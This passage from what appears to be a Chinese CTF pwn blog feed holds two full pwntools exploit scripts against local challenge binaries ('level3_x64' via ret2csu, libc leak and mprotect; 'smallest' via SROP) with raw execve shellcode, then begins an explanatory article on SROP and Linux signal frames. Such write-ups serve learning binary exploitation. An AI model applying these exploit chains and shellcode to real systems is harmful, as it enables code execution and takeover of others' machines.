class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span> <span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic -l 0x6261616a</span></span><br><span class="line"><span class="string">136</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~/Desktop/CTF$ ROPgadget --binary level3_x64 --only &quot;pop|ret&quot;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400550 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400499 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 11</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~/Desktop/CTF$</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4006b3</span> <span class="comment">#rdi, rsi, rdx</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x4006b1</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="number">0x4006AA</span></span><br><span class="line">mov_gadget=<span class="number">0x400690</span></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_plt_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br><span class="line">main_addr=<span class="number">0x40061A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got_addr)+p64(<span class="number">0x8</span>)+p64(write_got_addr)+p64(<span class="number">0x1</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line"><span class="comment">#payload1=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*6+p64(main_addr)</span></span><br><span class="line"><span class="comment">#payload1=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(write_plt_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">leak_write_real_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base=leak_write_real_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">read_got_addr=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(bss_addr)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_addr)+p64(<span class="number">0x100</span>)+p64(bss_addr)+p64(<span class="number">0x0</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">target_got=elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> target_got</span><br><span class="line"><span class="comment">#payload3=&#x27;a&#x27;*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_plt)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)</span></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got_addr)+p64(<span class="number">0x100</span>)+p64(target_got)+p64(<span class="number">0x0</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">target=libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(target)</span><br><span class="line">p.sendline(p64(target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(target_got)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x1000</span>)+p64(bss_addr-<span class="number">0xa88</span>)+p64(mov_gadget)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload5=<span class="string">&#x27;a&#x27;</span>*<span class="number">136</span>+p64(bss_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>上一道题的 SROP-smallest 也可以使用 mprotect 更改权限，感兴趣可以试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###https://bestwing.me/2017-360chunqiu-online.html</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">r.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write infor leak</span></span><br><span class="line">r.send(<span class="string">&quot;\xb3&quot;</span>)<span class="comment">#write 2 start_addr last byte</span></span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]:stack:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += <span class="built_in">str</span>(frame)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = (stack_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x108</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x108</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></span><br><span class="line">payload += <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SROP（1）--从两道题重新认识SROP attack</title>
    <link href="https://cyberangel.cn/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/"/>
    <id>https://cyberangel.cn/2021/05/31/SROP%EF%BC%881%EF%BC%89--%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/</id>
    <published>2021-05-31T02:14:53.000Z</published>
    <updated>2021-07-04T09:57:11.642Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><p>链接: <a href="https://pan.baidu.com/s/1XGou-bBu24upiAXuZu3EIA">https://pan.baidu.com/s/1XGou-bBu24upiAXuZu3EIA</a>   密码: wl0o</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在之前的文章中已经说过了 SROP：<br>但是这片文章是我刚刚学习 pwn 的时候写的，存在着理解不准确等原因，导致我现在都不想看之前写的东西，所以在这片文章中重新说一下。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="Signal-机制"><a href="#Signal-机制" class="headerlink" title="Signal 机制"></a>Signal 机制</h2><p>现在回顾一下 Linux 的 Signal 机制：Signal 机制是类 unix 系统（如 Linux、macOS 等）中进程之间相互传递信息的一种方法。在一般情况下我们也将其称为软中断信号（软中断）。比如说，进程之间可以通过系统调用 kill 来发送软中断信号以此结束某个进程。一般来说，信号机制常见的步骤如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622427836804-74299fab-e4be-4dfd-b0a3-613a9c6029f4.png#height=245&id=u539a6506&margin=%5Bobject%20Object%5D&name=image.png&originHeight=266&originWidth=816&originalType=binary%E2%88%B6=1&size=33108&status=done&style=none&width=751" alt="image.png"></p><blockquote><p>这个图你肯定十分的熟悉，毕竟快成为经典了</p></blockquote><p>1）当用户的程序（用户层）发起 signal 信号传递时，控制权由用户层切换到内核层（态），这时进程会被暂时挂起。<br>ucontent save：在内核层中会保存当前程序的状态（如寄存器）中的值到 stack 上，<strong>以及压入 Signal 信息和指向 rt_sigreturn 的系统调用地址，</strong>此时的 stack 结构如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622428798322-4f51130d-8763-4735-9a60-19d8b618cf86.png#height=454&id=u4e13228c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=711&originalType=binary%E2%88%B6=1&size=32385&status=done&style=none&width=547.5" alt="image.png"></p><blockquote><p>注意：栈的地址是从高地址向低地址生长的，上面的图从上到下指的是从高地址到低地址（栈顶方向）</p></blockquote><p>这里需要补充的是我们经常将 ucontext 和 siginfo 总称为 Signal Frame，由于<strong>Signal Frame 是保存在用户空间的 stack 上，因此我们可以任意修改它。</strong><br>2）然后会跳转到注册过的 signal handler 中处理相应的 signal。因此当 signal handler 执行完之后就会执行 rt_sigreturn。其中 32 位的 rt_sigreturn 的调用号为 77，64 位的系统调用号为 15。<br>3）<strong>内核执行 sigreturn 系统调用代码跳转到内核层恢复（pop）之前程序的状态（上下文）【ucontent restore】</strong><br>4）控制权交给用户层，继续执行用户层的程序代码<br>以下是 x86 和 x64 的 sigcontext：</p><blockquote><p>文章中使用的是 Linux-ubuntu 系统，文件和所在路径均为<br>/usr/include/x86_64-linux-gnu/bits/sigcontext.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_FXSR_MAGIC0x0000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* __x86_64__ */</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __x86_64__ */</span></span></span><br></pre></td></tr></table></figure><h2 id="SROP-攻击原理"><a href="#SROP-攻击原理" class="headerlink" title="SROP 攻击原理"></a>SROP 攻击原理</h2><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现内核主要做的工作就是为进程保存并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ol><li><strong>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</strong></li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 rt_sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ol><p>说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，这里以 64 位为例子如下图所示以给出 Signal Frame 更加详细的信息：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623152231088-132ea8ba-a60c-4774-a6af-31d84c432481.png#height=520&id=PZNN2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=691&originalType=binary%E2%88%B6=1&size=159321&status=done&style=none&width=535" alt="image.png"><br>当系统执行完 rt_sigreturn 系统调用时会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 pop rip 时就会将程序执行流指向 syscall 地址，根据相应寄存器的值，便会得到一个 shell。</p><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是在上面的例子中，我们只是单独的获得一个 shell。有时候我们会希望执行一系列的函数，这时只需要做两处修改即可：</p><ol><li>控制栈指针。</li><li>把原来 rip 指向的 syscall gadget 换成 syscall;ret gadget。</li></ol><p>如下图所示，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 rt_sigreturn 函数调用：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622430815485-3b40c90a-2e82-46c9-820a-fbeed6d372e9.png#height=359&id=TePeM&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=1023&originalType=binary%E2%88%B6=1&size=167236&status=done&style=none&width=695.5" alt="image.png"></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ol><li>可以通过栈溢出来控制栈的内容</li><li>需要知道相应的地址<ol><li>“/bin/sh”</li><li>Signal Frame</li><li>syscall</li><li>sigreturn</li></ol></li><li>需要有够大的空间来塞下整个 signal frame</li></ol><p>此外关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622431004932-2d966f0e-babe-4650-b6c0-36d93feac949.png#height=305&id=u7c61fb81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=793&originalType=binary%E2%88%B6=1&size=101071&status=done&style=none&width=608.5" alt="image.png"><br>并且作者发现有些系统上 SROP 的地址被随机化了，而有些则没有。比如说 Linux &lt; 3.3 x86_64（在 Debian 7.0，Ubuntu Long Term Support，CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622431063265-991ecf2a-5f40-4b07-881e-c3803ef8077d.png#height=333&id=u2a130297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=448&originWidth=789&originalType=binary%E2%88%B6=1&size=54071&status=done&style=none&width=586.5" alt="image.png"><br>但是目前它已经被 vsyscall-emulate 和 vdso 机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。<strong>值得一说的是，对于 rt_sigreturn 系统调用来说，在 64 位系统中，rt_sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 rt_sigreturn 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</strong></p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>值得高兴的是 pwntools 中已经集成了对 SROP 的攻击。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题 1"></a>例题 1</h2><blockquote><p>此例题来自：<a href="https://xz.aliyun.com/t/5240">https://xz.aliyun.com/t/5240</a></p></blockquote><p>原文中的附件已经给出了源代码和例题，这里选择看 IDA 吧，另外文件保护如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622431615754-df012716-0a07-4d9b-bf53-ad7829f6fdef.png#height=520&id=u04f56264&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-31%2011.26.50.png&originHeight=520&originWidth=2748&originalType=binary%E2%88%B6=1&size=123604&status=done&style=none&width=2748" alt="截屏2021-05-31 11.26.50.png"><br>main 函数的汇编如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 